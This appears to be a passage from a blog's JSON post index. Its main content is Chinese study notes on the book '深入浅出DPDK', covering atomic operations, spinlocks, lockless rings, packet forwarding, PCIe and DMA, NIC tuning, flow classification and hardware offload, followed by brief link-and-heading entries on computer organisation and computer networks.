语言的int类型，主要是因为：\n1）让原子函数只接受atomic_t类型操作数，可以确保原子操作只与 这种特殊类型数据一起使用。\n2）使用atomic_t类型确保编译器不对相应的值进行访问优化。\n3）使用atomic_t类型可以屏蔽不同体系结构上的数据类型的差异。 尽管Linux支持的所有机器上的整型数据都是32位，但是使用atomic_t的 代码只能将该类型的数据当作24位来使用。这个限制完全是因为在 SPARC体系结构上，原子操作的实现不同于其他体系结构：32位int类 型的低8位嵌入了一个锁，因为SPARC体系结构对原子操作缺乏指令级 的支持，所以只能利用该锁来避免对原子类型数据的并发访问。 原子整数操作最常见的用途就是实现计数器。原子操作通常是内敛 函数，往往通过内嵌汇编指令来实现。如果某个函数本来就是原子的， 那么它往往会被定义成一个宏。\n2.原子性与顺序性 原子性确保指令执行期间不被打断，要么全部执行，要么根本不执 行。而顺序性确保即使两条或多条指令出现在独立的执行线程中，甚至 独立的处理器上，它们本该执行的顺序依然要保持。\n3.原子位操作 原子位操作定义在文件中。令人感到奇怪的是，位操作函数是对普 通的内存地址进行操作的。原子位操作在多数情况下是对一个字长的内 存访问，因而位编号在0~31之间（在64位机器上是0~63之间），但是对 位号的范围没有限制。\n4.1.3 DPDK原子操作实现和应用 https://zhuanlan.zhihu.com/p/125737864\n在理解原子操作在DPDK的实现之前，建议读者仔细阅读并且能够 理解第2章的内容，那部分是我们理解内存操作的基础，因为原子操作 的最终反映也是对内存资源的操作。 原子操作在DPDK代码中的定义都在rte_atomic.h文件中，主要包含 两部分：内存屏蔽和原16、32和64位的原子操作API。\n4.2 读写锁 4.2.1 Linux读写锁主要API 4.2.2 DPDK读写锁实现和应用 读写锁在DPDK中主要应用在下面几个地方，对操作的对象进行保 护。\n·在查找空闲的memory segment的时候，使用读写锁来保护memseg 结构。LPM表创建、查找和释放。\n·Memory ring的创建、查找和释放。\n·ACL表的创建、查找和释放。\n·Memzone的创建、查找和释放等。\n4.3 自旋锁 何谓自旋锁（spin lock）？它是为实现保护共享资源而提出一种锁 机制。其实，自旋锁与互斥锁比较类似，它们都是为了解决对某项资源 的互斥使用。无论是互斥锁，还是自旋锁，在任何时刻，最多只能有一 个保持者，也就说，在任何时刻最多只能有一个执行单元获得锁。但是 两者在调度机制上略有不同。对于互斥锁，如果资源已经被占用，资源 申请者只能进入睡眠状态。但是自旋锁不会引起调用者睡眠，如果自旋 锁已经被别的执行单元保持，调用者就一直循环在那里看是否该自旋锁 的保持者已经释放了锁，“自旋”一词就是因此而得名。\n4.3.1 自旋锁的缺点 自旋锁必须基于CPU的数据总线锁定，它通过读取一个内存单元 （spinlock_t）来判断这个自旋锁是否已经被别的CPU锁住。如果否，它 写进一个特定值，表示锁定了总线，然后返回。如果是，它会重复以上 操作直到成功，或者spin次数超过一个设定值。记住上面提及到的：锁 定数据总线的指令只能保证一个指令操作期间CPU独占数据总线。（自 旋锁在锁定的时侯，不会睡眠而是会持续地尝试）。其作用是为了解决 某项资源的互斥使用。因为自旋锁不会引起调用者睡眠，所以自旋锁的 效率远高于互斥锁。虽然自旋锁的效率比互斥锁高，但是它也有些不足 之处：\n1）自旋锁一直占用CPU，它在未获得锁的情况下，一直运行—— 自旋，所以占用着CPU，如果不能在很短的时间内获得锁，这无疑会使 CPU效率降低。\n2）在用自旋锁时有可能造成死锁，当递归调用时有可能造成死 锁，调用有些其他函数（如copy_to_user（）、copy_from_user（）、 kmalloc（）等）也可能造成死锁。\n因此我们要慎重使用自旋锁，自旋锁只有在内核可抢占式或SMP的 情况下才真正需要，在单CPU且不可抢占式的内核下，自旋锁的操作为 空操作。自旋锁适用于锁使用者保持锁时间比较短的情况。\n4.3.2 Linux自旋锁API 自旋锁使用时有两点需要注意：\n1）自旋锁是不可递归的，递归地请求同一个自旋锁会造成死锁。\n2）线程获取自旋锁之前，要禁止当前处理器上的中断。（防止获 取锁的线程和中断形成竞争条件）\n比如：当前线程获取自旋锁后，在临界区中被中断处理程序打断， 中断处理程序正好也要获取这个锁，于是中断处理程序会等待当前线程 释放锁，而当前线程也在等待中断执行完后再执行临界区和释放锁的代 码。\n4.3.3 DPDK自旋锁实现和应用 DPDK中自旋锁API的定义在rte_spinlock.h文件中，其中下面三个 API被广泛的应用在告警、日志、中断机制、内存共享和link bonding的 代码中，用于临界资源的保护。\n4.4 无锁机制 当前，高性能的服务器软件（例如，HTTP加速器）在大部分情况 下是运行在多核服务器上的，当前的硬件可以提供32、64或者更多的 CPU，在这种高并发的环境下，锁竞争机制有时会比数据拷贝、上下文 切换等更伤害系统的性能。因此，在多核环境下，需要把重要的数据结 构从锁的保护下移到无锁环境，以提高软件性能。 所以，现在无锁机制变得越来越流行，在特定的场合使用不同的无 锁队列，可以节省锁开销，提高程序效率。Linux内核中有无锁队列的 实现，可谓简洁而不简单。\n4.4.1 Linux内核无锁环形缓冲 环形缓冲区通常有一个读指针和一个写指针。读指针指向环形缓冲 区中可读的数据，写指针指向环形缓冲区中可写的数据。通过移动读指 针和写指针就可以实现缓冲区的数据读取和写入。在通常情况下，环形 缓冲区的读用户仅仅会影响读指针，而写用户仅仅会影响写指针。如果 仅仅有一个读用户和一个写用户，那么不需要添加互斥保护机制就可以 保证数据的正确性。但是，如果有多个读写用户访问环形缓冲区，那么 必须添加互斥保护机制来确保多个用户互斥访问环形缓冲区。具体来 讲，如果有多个写用户和一个读用户，那么只是需要给写用户加锁进行 保护；反之，如果有一个写用户和多个读用户，那么只是需要对读用户 进行加锁保护。\n在Linux内核代码中，kfifo就是采用无锁环形缓冲的实现，kfifo是 一种“First In First Out”数据结构，它采用了前面提到的环形缓冲区来实 现，提供一个无边界的字节流服务。采用环形缓冲区的好处是，当一个 数据元素被用掉后，其余数据元素不需要移动其存储位置，从而减少拷 贝，提高效率。更重要的是，kfifo采用了并行无锁技术，kfifo实现的单 生产/单消费模式的共享队列是不需要加锁同步的。\n4.4.2 DPDK无锁环形缓冲 基于无锁环形缓冲的的原理，Intel DPDK提供了一套无锁环形缓冲 区队列管理代码，支持单生产者产品入列，单消费者产品出列；多名生 产者产品入列，多名消费者出列操作\n4.4.2.1 rte_ring的数据结构定义 下面是DPDK中的rte_ring的数据结构定义，可以清楚地理解rte_ring 的设计基础。\n4.4.2.2 环形缓冲区的剖析 4.4.2.3 单生产者入队 4.4.2.4 单消费者出队 4.4.2.5 多生产者入队 4.5 小结 原子操作适用于对单个bit位或者单个整型数的操作，不适用于对临 界资源进行长时间的保护。\n自旋锁主要用来防止多处理器中并发访问临界区，防止内核抢占造 成的竞争。另外，自旋锁不允许任务睡眠（持有自旋锁的任务睡眠会造 成自死锁——因为睡眠有可能造成持有锁的内核任务被重新调度，而再 次申请自己已持有的锁），它能够在中断上下文中使用。\n读写锁实际是一种特殊的自旋锁，适用于对共享资源的访问者划分 成读者和写者，读者只对共享资源进行读访问，写者则需要对共享资源 进行写操作。写者是排他性的，一个读写锁同时只能有一个写者或多个 读者（与CPU数相关），但不能同时既有读者又有写者。\n无锁队列中单生产者——单消费者模型中不需要加锁，定长的可以 通过读指针和写指针进行控制队列操作，变长的通过读指针、写指针、 结束指针控制操作。\n（一）多对多（一）模型中正常逻辑操作是要对队列操作进行加锁 处理。加锁的性能开销较大，一般采用无锁实现，DPDK中就是采用的 无锁实现，加锁的性能开销较大，DPDK中采用的无锁数据结构实现， 非常高效。\n每种同步互斥机制都有其适用场景，我们在使用的时候应该扬长避 短，最大限度地发挥它们的优势，这样才能编写高性能的代码。另外， 在DPDK代码中，这些机制都在用户空间中实现，便于移植，所以又可 以为编写其他用户空间的代码提供参考和便利\n第5章 报文转发 对于一个报文的整个生命周期如何从一个对接运营商的外部接口进 入一个路由器，再通过一个连接计算机的内部接口发送出去的过程，大 家应该是充满好奇和疑问的，整个报文处理的流程就如同计算机的中央 处理器对于指令的处理具有重复性、多样性、复杂性和高效性。只有弄 清其中每个环节才能帮助我们更有效地提高网络报文的处理能力\n5.1 网络处理模块划分 网络报文的处理和转发主要分为硬件处理部分与软件处理部分，由 以下模块构成：\n·Packet input：报文输入。\n·Pre-processing：对报文进行比较粗粒度的处理。\n·Input classification：对报文进行较细粒度的分流。\n·Ingress queuing：提供基于描述符的队列FIFO。\n·Delivery/Scheduling：根据队列优先级和CPU状态进行调度。\n·Accelerator：提供加解密和压缩/解压缩等硬件功能。\n·Egress queueing：在出口上根据QOS等级进行调度。\n·Post processing：后期报文处理释放缓存。\n·Packet output：从硬件上发送出去。\n如图5-1所示，我们可以看到在浅色和阴影对应的模块都是和硬件 相关的，因此要提升这部分性能的最佳选择就是尽量多地去选择网卡上 或网络设备芯片上所提供的一些和网络特定功能相关的卸载的特性，而 在深色软件部分可以通过提高算法的效率和结合CPU相关的并行指令来 提升网络性能。了解了网络处理模块的基本组成部分后，我们再来看不 同的转发框架下如何让这些模块协同工作完成网络包处理。\n5.2 转发框架介绍 传统的Network Processor（专用网络处理器）转发的模型可以分为 run to completion（运行至终结，简称RTC）模型和pipeline（流水线） 模型。\n1.pipeline模型 从名字上，就可以看出pipeline模型借鉴于工业上的流水线模型， 将一个功能（大于模块级的功能）分解成多个独立的阶段，不同阶段间 通过队列传递产品。这样，对于一些CPU密集和I/O密集的应用，通过 pipeline模型，我们可以把CPU密集的操作放在一个微处理引擎上执行， 将I/O密集的操作放在另外一个微处理引擎上执行。通过过滤器可以为 不同的操作分配不同的线程，通过连接两者的队列匹配两者的处理速 度，从而达到最好的并发效率。\n2.run to completion模型 run to completion（运行至终结）模型是主要针对DPDK一般程序的 运行方法，一个程序中一般会分为几个不同的逻辑功能，但是这几个逻 辑功能会在一个CPU的核上运行，我们可以进行水平扩展使得在SMP的 系统中多个核上执行一样逻辑的程序，从而提高单位时间内事务处理的 量。但是由于每个核上的处理能力其实都是一样的，并没有针对某个逻 辑功能进行优化，因此在这个层面上与pipeline模型比较，run to completion模型是不高效的。\n5.3 转发算法 除了良好的转发框架之外，转发中很重要的一部分内容就是对于报 文字段的匹配和识别，在DPDK中主要用到了精确匹配（Exact Match） 算法和最长前缀匹配（Longest Prefix Matching，LPM）算法来进行报文 的匹配从而获得相应的信息。\n5.3.1 精确匹配算法 精确匹配算法的主要思想就是利用哈希算法对所要匹配的值进行哈 希，从而加快查找速度。决定哈希性能的主要参数是负载参数\n介绍了哈希相关的一些基础后，我们来看下DPDK的具体实现。 DPDK中主要支持CRC32和J hash，这里主要介绍CRC相关的内容和优 化。 其实，精确匹配主要需要解决两个问题：进行数据的签名（哈 希），解决哈希的冲突问题。CRC32和J hash是两个数字签名的不同算 法。我们先来看下CRC。\n5.3.2 最长前缀匹配算法 最长前缀匹配（Longest Prefix Matching，LPM）算法是指在IP协议 中被路由器用于在路由表中进行选择的一个算法。 因为路由表中的每个表项都指定了一个网络，所以一个目的地址可 能与多个表项匹配。最明确的一个表项——即子网掩码最长的一个—— 就叫做最长前缀匹配。之所以这样称呼它，是因为这个表项也是路由表 中与目的地址的高位匹配得最多的表项。\n5.3.3 ACL算法 ACL主要思路就是创建了Tier相关的数据结构，匹配字段中每个字 段中的每个字节都会作为Tier中的一层进行匹配，每一层都作为到达最 终匹配结果的一个路径。\n5.3.4 报文分发 Packet distributor（报文分发）是DPDK提供给用户的一个用于包分 发的API库，用于进行包分发。\n一般是通过一个distributor分发到不同的 worker上进行报文处理，当报文处理完后再通过worker返回给 distributor\n5.4 小结 本章着重讲述了DPDK的数据报文转发模型以及常用的基本转发算 法，包括两种主要使用的模式run to completion和pipeline，然后详细介 绍了三种转发算法和一个常用的DPDK报文分发库。通过本章的内容， 读者可以了解基本的网络包处理流程和DPDK的工作模式\n第6章 PCIe与包处理I/O  PCI总线取得了很大的成功，但随着CPU的主频不断提高，PCI总线的带宽也捉襟见肘。此外，它本身存在一些架构上的缺陷，面临一系列挑战，包括带宽、流量控制、数据传送质量等； PCIe应运而生，能有效解决这些问题，所以PCIe才是我们的主角；  前面各章主要讨论CPU上数据包处理的各种相关优化技术。从本章 开始，我们的视线逐步从CPU转移到网卡I/O。这一章将会从CPU与I/O 的总线PCIe开始，带领读者领略CPU与网卡DMA协同工作的整个交互 过程，量化分析PCIe数据包传输的理论带宽。以此为基础，进一步剖析 性能优化的思考过程，分享实践的心得体会\n6.1 从PCIe事务的角度看包处理 6.1.1 PCIe概览 https://www.cnblogs.com/LoyenWang/p/14165852.html\nPCIe（PCI Express）是目前PC和嵌入式系统中最常用的高速总线，PCIe在PCI的基础上发展而来，在软件上PCIe与PCI是后向兼容的，PCI的系统软件可以用在PCIe系统中。\n外设组件互联标准\nPCI Express（Peripheral Component Interconnect Express）又称 PCIe，它是一种高速串行通信互联标准。格式说明由外设组件互联特别 兴趣小组PCI-SIG（PCI Special Interest Group）维护，以取代传统总线 通信架构，如PCI、PCI-X以及AGP。\n理解包在PCIe上如何传输，首先需要了解PCIe是一种怎样的数据传 输协议规范。\nPCIe规范遵循开放系统互联参考模型（OSI），自上而下分为事务 传输层、数据链路层、物理层，如图6-1a所示。对于特定的网卡（如图 6-1b所示），PCIe一般作为处理器外部接口，把物理层朝PCIe根组件 （Root Complex）方向的流量叫做上游流量（upstream或者inbound）， 反之叫做下游流量（downstream或者outbound）。\n6.1.2 PCIe事务传输 如果在PCIe的线路上抓取一个TLP（Transaction Layer Packet，事务 传输层数据包），其格式就如图6-2所示，它是一种分组形式，层层嵌 套，事务传输层也拥有头部、数据和校验部分。应用层的数据内容就承 载在数据部分，而头部定义了一组事务类型。表6-1列出了所有支持的 TLP包类型。对于CPU从网卡收发包来说，用到的PCIe的事务类型主要 以Memory Read/Write（MRd/MWr）和Completion with Data（CpID）为 主\n6.1.3 PCIe带宽 6.2 PCIe上的数据传输能力 可是除了TLP的协议开销以外，有时还会有实现开销的存在。比如 有些网卡可能会要求每个TLP都要从Lane0开始，甚至要求从偶数的时 钟周期开始。由于存在这样的实现因素影响，有效带宽还会进一步降 低。\n6.3 网卡DMA描述符环形队列 DMA（Direct Memory Access，直接存储器访问）是一种高速的数 据传输方式，允许在外部设备和存储器之间直接读写数据。数据既不通 过CPU，也不需要CPU干预。整个数据传输操作在DMA控制器的控制 下进行。除了在数据传输开始和结束时做一点处理外，在传输过程中 CPU可以进行其他的工作。\n网卡DMA控制器通过环形队列与CPU交互。环形队列由一组控制 寄存器和一块物理上连续的缓存构成。主要的控制寄存器有Base、 Size、Head和Tail。通过设置Base寄存器，可以将分配的一段物理连续 的内存地址作为环形队列的起始地址，通告给DMA控制器。同样通过 Size寄存器，可以通告该内存块的大小。Head寄存器往往对软件只读， 它表示硬件当前访问的描述符单元。而Tail寄存器则由软件来填写更 新，通知DMA控制器当前已准备好被硬件访问的描述符单元。\n6.4 数据包收发——CPU和I/O的协奏 DMA控制器通过一组描述符环行队列与CPU互操作完成包的收 发。环形队列的内容部分位于主存中，控制部分通过访问外设寄存器的 方式完成。\n从CPU的角度来看，主要的操作分为系统内存（可能是处理器的缓 存）的直接访问和对外部寄存器MMIO的操作。对于MMIO的操作需经 过PCIe总线的传输。由于外部寄存器访问的数据宽度有限（例如，32bit 的Tail寄存器），其PCIe事务有效传输率很低。另外由于PCIe总线访问 的高时延特性，在数据包收发中应该尽量减少操作来提高效率。本节后 续部分会继续讨论MMIO操作的优化。对于前者CPU直接访存部分，这 会在7.2节更系统地介绍，从减少CPU开销的角度来讨论更有效访存的方 法。\n从PCIe设备上DMA控制器的角度来看，其操作有访问系统内存和 PCIe设备上的片上内存（in-chip memory）。这里不讨论片上内存。所 以从DMA控制器来讲，我们主要关注其通过PCIe事务传输的访问系统 内存操作。绝大多数收发包的PCIe带宽都被这类操作消耗。所以很有必 要去了解一下都有哪些操作，我们也会在本节进行介绍，并分析如何优 化这类操作。\n6.5 PCIe的净荷转发带宽 6.6 Mbuf与Mempool 6.7 小结 本章带领读者探访了I/O和CPU之间关于数据包处理的各项技术及 优化细节。下一章就将进入到网卡内部，去探究网卡性能调试的方法\n第7章 网卡性能优化 前面介绍了PCIe这一层级的细节，接下来就从DPDK在软件设计、 硬件平台选择和配置以及软件平台的设置等方面深入分析和介绍怎样完 成网卡性能优化，并且跑出最优的性能\n7.1 DPDK的轮询模式 DPDK采用了轮询或者轮询混杂中断的模式来进行收包和发包，此 前主流运行在操作系统内核态的网卡驱动程序基本都是基于异步中断处 理模式。\n7.1.1 异步中断模式 当有包进入网卡收包队列后，网卡会产生硬件 （MSIX/MSI/INTX）中断，进而触发CPU中断，进入中断服务程序，在 中断服务程序（包含下半部）来完成收包的处理。当然为了改善包处理 性能，也可以在中断处理过程中加入轮询，来避免过多的中断响应次 数。总体而言，基于异步中断信号模式的收包，是不断地在做中断处 理，上下文切换，每次处理这种开销是固定的，累加带来的负荷显而易 见。在CPU比I/O速率高很多时，这个负荷可以被相对忽略，问题不 大，但如果连接的是高速网卡且I/O频繁，大量数据进出系统，开销累 加就被充分放大。中断是异步方式，因此CPU无需阻塞等待，有效利用 率较高，特别是在收包吞吐率比较低或者没有包进入收包队列的时候， CPU可以用于其他任务处理。\n当有包需要发送出去的时候，基于异步中断信号的驱动程序会准备 好要发送的包，配置好发送队列的各个描述符。在包被真正发送完成 时，网卡同样会产生硬件中断信号，进而触发CPU中断，进入中断服务 程序，来完成发包后的处理，例如释放缓存等。与收包一样，发送过程 也会包含不断地做中断处理，上下文切换，每次中断都带来CPU开销； 同上，CPU有效利用率高，特别是在发包吞吐率比较低或者完全没有发 包的情况。\n7.1.2 轮询模式 7.1.3 混和中断轮询模式 DPDK的混合中断轮询机制是基于UIO或VFIO来实现其收包中断通 知与处理流程的。如果是基于VFIO的实现，该中断机制是可以支持队 列级别的，即一个接收队列对应一个中断号，这是因为VFIO支持多 MSI-X中断号。但如果是基于UIO的实现，该中断机制就只支持一个中 断号，所有的队列共享一个中断号\n在应用场景下如何更高效地利用处理器的计算 能力，用户需要根据实际应用场景来做出最合适的选择\n7.2 网卡I/O性能优化 7.2.1 Burst收发包的优点 Burst收发包就是DPDK的优化模式，它把收发包复杂的处理过程进 行分解，打散成不同的相对较小的处理阶段，把相邻的数据访问、相似 的数据运算集中处理。这样就能尽可能减少对内存或者低一级的处理器 缓存的访问次数，用更少的访问次数来完成更多次收发包运算所需要数 据的读或者写。\n7.2.2 批处理和时延隐藏 1）时延（Latency）：处理器核心执行单元完成一条指令 （instruction）所需要的时钟周期数。\n2）吞吐（Throughput）：处理器指令发射端口再次允许接受相同 指令所需等待的时钟周期数。\n时延描述了前后两个关联操作的等待时间，吞吐则描述了指令的并 发能力。在时延相对固定的情况下，要提升指令执行的整体性能，利用 有些指令的多发能力就显得很重要。\n7.3 平台优化及其配置调优 7.3.1 硬件平台对包处理性能的影响 7.3.2 软件平台对包处理性能的影响 7.4 队列长度及各种阈值的设置 7.4.1 收包队列长度 收包队列的长度就是每个收包队列分配的收包描述符个数，每个收 包描述符都会分配有对应的Mbuf缓存块。收包队列的长度就表示了在 软件驱动程序读取所收到的包之前最大的缓存包的能力，长度越长，则 可以缓存更多的包，长度越短，则缓存更少的包。\n7.4.2 发包队列长度 7.4.3 收包队列可释放描述符数量阈值（rx_free_thresh） 每一次收包函数的调用都可能成功 读取0、1或者多个包。每读出一个包，与之对应的收包描述符就是可以 释放的了，可以配置好用来后续收包过程。由收发包过程知道，需要更 新表示收包队列尾部索引的寄存器来通知硬件。实际上，DPDK驱动程 序并没有每次收包都更新收包队列尾部索引寄存器，而是在可释放的收 包描述符数量达到一个阈值（rx_free_thresh）的时候才真正更新收包队 列尾部索引寄存器。这个可释放收包描述符数量阈值在驱动程序里面的 默认值一般都是32，\n7.4.4 发包队列发送结果报告阈值（tx_rs_thresh） 7.4.5 发包描述符释放阈值（tx_free_thresh） 当网卡硬件读取完发包描述符，并且DMA完成整个包的内容的传 送后，硬件就会根据发送结果回写标记来通知软件发包过程全部完成。 这时候，这些发包描述符就可以释放或者再次利用了，与之对应的 Mbuf也可以释放了。\n7.5 小结 网卡性能的优化还涉及怎么更好地利用网卡硬件本身的功能特点。 系统优化需要很好地利用软件和硬件平台的各种可以优化细节共同地达 到优化的目的。本章从网卡、处理器、内存、PCIe接口等硬件系统，以 及BIOS、操作系统和DPDK软件编写角度总结了影响系统性能的元素， 讨论了怎样配置和使用来展示出网卡的最优性能。后续章节会继续介绍 高速网卡在并行化处理以及智能化、硬件卸载方面的一些新功能\n第8章 流分类与多队列 多队列与流分类是当今网卡通用的技术。利用多队列及流分类技术 可以使得网卡更好地与多核处理器、多任务系统配合，从而达到更高效 IO处理的目的。 接下来的章节将以Intel的网卡为例，主要介绍其多队列和流分类是 如何工作的，各种分类方式适用于哪些场景，DPDK又是如何利用网卡 这些特性。\n8.1 多队列 8.1.1 网卡多队列的由来 说起网卡多队列，顾名思义，也就是传统网卡的DMA队列有多 个，网卡有基于多个DMA队列的分配机制。\n网卡多队列技术是一个硬件手段，需要结合软件将它很好地利用起 来从而达到设计的需求。利用该技术，可以做到分而治之，比如每个应 用一个队列，应用就可以根据自己的需求来对数据包进行控制。比如视 频数据强调实时性，而对数据的准确性要求不高，这样我们可以为其队 列设置更高的发送优先级，或者说使用更高优先级的队列，为了达到较 好的实时性，我们可以减小队列对应的带宽。而对那些要求准确性但是 不要求实时的数据（比如电子邮件的数据包队列），我们可以使用较低 的优先级和更大的带宽。\n8.1.2 Linux内核对多队列的支持 8.1.3 DPDK与多队列 那么对于DPDK而言，其多队列是如何支持的呢。如果我们来观察 DPDK提供的一系列以太网设备的API，可以发现其Packet I/O机制具有 与生俱来的多队列支持功能，可以根据不同的平台或者需求，选择需要 使用的队列数目，并可以很方便地使用队列，指定队列发送或接收报 文。\n·将网卡的某个接收队列分配给某个核，从该队列中收到的所有报 文都应当在该指定的核上处理结束。\n·从核对应的本地存储中分配内存池，接收报文和对应的报文描述 符都位于该内存池。\n·为每个核分配一个单独的发送队列，发送报文和对应的报文描述 符都位于该核和发送队列对应的本地内存池中。\n8.1.4 队列分配 8.2 流分类 本章要讲述的流分类，指的是网卡依据数据包的特性将其分类的技 术。分类的信息可以以不同的方式呈现给数据包的处理者，比如将分类 信息记录于描述符中，将数据包丢弃或者将流导入某个或者某些队列 中。\n8.2.1 包的类型 高级的网卡设备可以分析出包的类型，包的类型会携带在接收描述 符中，应用程序可以根据描述符快速地确定包是哪种类型的包，避免了 大量的解析包的软件开销。\n网卡设备同时可以根据包的类型确定其关键字，从而根据关键字确 定其收包队列。上面章节提及的RSS及下面提到的Flow Director技术都 是依据包的类型匹配相应的关键字，从而决定其DMA的收包队列。\n8.2.2 RSS 这里要介绍一种网卡上用 于将流量分散到不同的队列中的技术：RSS（Receive-Side Scaling，接 收方扩展），它是和硬件相关联的，\n简单的说，RSS就是根据关键字通过哈希函数计算出哈希值，再由 哈希值确定队列。关键字是如何确定的呢？网卡会根据不同的数据包类 型选取出不同的关键字，见表8-1。比如IPV4UDP包的关键字就由四元 组组成（源IP地址、目的IP地址、源端口号、目的端口号），IPv4包的 关键字则是源IP地址和目的IP地址。更为灵活的是，使用者甚至可以修 改包类型对应的关键字以满足不同的需求。\nRSS是否能将数据包均匀地散列在多个 队列中，取决于真实环境中的数据包构成和哈希函数的选取\n8.2.3 Flow Director Flow Director技术是Intel公司提出的根据包的字段精确匹配，将其 分配到某个特定队列的技术。\n相比RSS的负载分担功能，它更加强调特定性。\n比如，用户可以为某几个特定的TCP对话（S-IP+D-IP+S-Port+D\u0002Port）预留某个队列，那么处理这些TCP对话的应用就可以只关心这个 特定的队列，从而省去了CPU过滤数据包的开销，并且可以提高cache 的命中率。\n8.2.4 服务质量 多队列应用于服务质量（QoS）流量类别：把发送队列分配给不同 的流量类别，可以让网卡在发送侧做调度；把收包队列分配给不同的流 量类别，可以做到基于流的限速。根据流中优先级或业务类型字段，可 以将流不同的业务类型有着不同的调度优先级及为其分配相应的带宽， 一般网卡依照VLAN标签的UP（User Priority，用户优先级）字段。网 卡依据UP字段，将流划分到某个业务类型（TC，Traffic Class），网卡 设备根据TC对业务做相应的处理，比如确定相对应的队列，根据优先 级调度等。\n以Intel® 82599网卡为例，其使用DCB模型在网卡上实现QoS的功 能。DCB（Data Center Bridge）是包含了差分服务的一组功能，\n1.发包方向\n2.收包方向\n8.2.5 虚拟化流分类方式 前面的章节介绍了RSS、Flow Director、QoS几种按照不同的规则分 配或指定队列的方式。另外，较常用的还有在虚拟化场景下多多队列方 式。\n8.2.6 流过滤 流的合法性验证的主要任务是决定哪些数据包是合法的、可被接收 的。合法性检查主要包括对外部来的流和内部流的验证。\n1）MAC地址的过滤（L2Filter）。 2）VLAN标签的过滤。 3）管理数据包的过滤\n8.3 流分类技术的使用 当下流行的多队列网卡往往支持丰富的流分类技术，我们可以很好 地利用这些特定的分类机制，跟软件更好结合以满足多种多样的需求。\n8.3.1 DPDK结合网卡Flow Director功能 一个设备需要一定的转发功能来处理数据平面的报文，同时需要处 理一定量的控制报文。对于转发功能而言，要求较高的吞吐量，需要多 个core来支持；对于控制报文的处理，其报文量并不大，但需要保证其 可靠性，并且其处理逻辑也不同于转发逻辑。那么，我们就可以使用 RSS来负载均衡其转发报文到多个核上，使用Flow Director将控制报文 分配到指定的队列上，使用单独的核来处理。\n1）这样可以帮助用户在设计时做到分而治之。\n2）节省了软件过滤数据报文的开销。\n3）避免了应用在不同核处理之间的切换。\n8.3.2 DPDK结合网卡虚拟化及Cloud Filter功能 8.4 可重构匹配表 可重构匹配表（Reconfigurable Match Table，RMT）是软件自定义 网络（Software Defined Networking，SDN）中提出的用于配置转发平面 的通用配置模型，\n8.5 小结 当前行业高速网卡芯片提供商数量已经很少，网卡之间的功能差异 不大，但细节可能不同，使用具体功能之前，需要参见网卡手册。作为 相对成熟的技术，网卡功能大同小异，负载均衡与流分类是网络最基本 的功能，利用好网卡硬件特性，可以提高系统性能。充分理解网卡特 性，利用好网卡，需要一定的技术积累。\n总体上，高速网卡智能化处理发展是个趋势。数据中心期望大量部 署基于网络虚拟化的应用，需要对进出服务器系统的数据报文实施安全 过滤、差异化服务的策略。在实现复杂网络功能又不占用过多运算资 源，智能化网卡被期待来实现这些功能服务\n硬件加速和功能卸载 VLAN硬件卸载\nIEEE1588硬件卸载功能\nIP TCP/UDP/SCTP checksum硬件卸载功能\nchecksum计算是网络协议的容错性设计的一部分，基于网络传输不 可靠的假设，因此在Ethernet、IPv4、UDP、TCP、SCTP各个协议层设 计中都有checksum字段，用于校验包的正确性，checksum不涉及复杂的 逻辑。虽然各个协议定义主体不同，checksum算法参差不齐，但总体归 纳，checksum依然可以说是简单机械的计算，算法稳定，适合固化到硬 件中。需要注意的是，checksum可以硬件卸载，但依然需要软件的协同 配合实现。\n分片功能卸载 TSO\nTSO（TCP Segment Offload）是TCP分片功能的硬件卸载，显然这 是发送方向的功能。如我们所知，TCP会协商决定发送的TCP分片的大 小。对于从应用层获取的较大的数据，TCP需要根据下层网络的报文大 小限制，将其切分成较小的分片发送。\n组包功能卸载 RSC\nRSC（Receive Side Coalescing，接收方聚合）是TCP组包功能的硬 件卸载。硬件组包功能实际上是硬件拆包功能的逆向功能。 硬件组包功能针对TCP实现，是接收方向的功能，可以将拆分的 TCP分片聚合成一个大的分片，从而减轻软件的处理。 当硬件接收到TCP分片后，如图9-6和图9-7所示，硬件可以将多个 TCP分片缓存起来，并且将其排序，这样，硬件可以将一串TCP分片的 内容聚合起来。这样多个TCP分片最终传递给软件时将会呈现为一个分 片，这样带给软件的好处是明显的，软件将不再需要分析处理多个数据 包的头，同时对TCP包的排序的负担也有所减轻\n9.8 小结 硬件卸载功能实际上是网卡功能的增强，通过由网卡硬件提供额外 的功能来分担CPU的处理负荷。可以认为是有好处而没有额外短处的功 能。但需要明确的是，由于硬件多种多样，硬件卸载功能的支持与否以 及支持的程度都可能不同，同时应用程序需要了解并使用硬件卸载功 能，否则是无法从硬件卸载功能中得到好处的。因此，这对开发者提出 了额外的要求\n","permalink":"https://kevinerr.github.io/posts/tech/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAdpdk/","summary":"第2章 Cache和内存 2.1 存储系统简介 本章会讨论Cache和内存 2.21 系统架构的演进 北桥也称为主桥（Host Bridge），主要用来处理高速信号，","title":"深入浅出dpdk"},{"content":"https://blog.csdn.net/weixin_43914604/article/details/104096298\n","permalink":"https://kevinerr.github.io/posts/tech/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","summary":"https://blog.csdn.net/weixin_43914604/article/details/104096298","title":"计算机组成原理"},{"content":"https://blog.csdn.net/weixin_43914604/article/details/104722679\n第1 章 计算机网络体系结构 1.1 计算机网络概述 1.1.1 计算机网络的概念、组成、功能和分类 1.1.2 计算机网络的性能指标（速率、带宽、吞吐量、时延、往返时延、时延带宽积、信道利用率）\n1.2 计算机网络体系结构与参考模型 1.2.1 计算机网络的分层结构、协议、服务和接口 1.2.2 OSI参考模型（应用层、表示层、会话层、传输层、网络层、数据链路层、物理层） 1.2.3 TCP/PI参考模型（应用层、传输层、网际层、网络接口层）、五层参考模型（应用层、传输层、网络层、数据链路层、物理层）、OSI与TCP/IP参考模型比较\n1.0.0 计算机网络体系结构总结\n第 2 章 物理层 首先要强调指出，物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。大家知道，现有的计算机网络中的硬件设备和传输媒体的种类非常繁多，而通信手段也有许多不同方式。物理层的作用正是要尽可能地屏蔽掉这些传输媒体和通信手段的差异，使物理层上面的数据链路层感觉不到这些差异，这样就可使数据链路层只需要考虑如何完成本层的协议和服务，而不必考虑网络具体的传输媒体和通信手段是什么。用于物理层的协议也常称为物理层规程(procedure)。其实物理层规程就是物理层协议。\n0101变成高低电频\n2.1 通信基础 2.1.1 物理层接口特性、数据通信模型、物理层基本概念（数据、信号、码元 、信源、信道、信宿 、速率、波特、带宽） 